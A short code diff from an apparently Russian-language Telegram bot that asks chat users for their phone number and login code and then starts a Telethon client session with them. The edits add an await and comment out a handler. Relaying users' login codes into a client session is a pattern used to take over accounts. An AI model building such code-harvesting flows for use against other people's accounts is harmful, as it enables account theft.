@@ -79,7 +79,7 @@ async def get_phone_number(message: types.Message):
         await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
         #Потом убрать все что ниже
         phone = input('Введите номер')
-        client = TelegramClient(phone, api_id, api_hash).start(phone)
+        client = await TelegramClient(phone, api_id, api_hash).start(phone)
 
         # После успешной авторизации выполнение функций
         selection = '0'
@@ -108,7 +108,7 @@ async def get_phone_number(message: types.Message):
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
 
-@dp.message_handler(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
+#@dp.message_handler(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
 async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
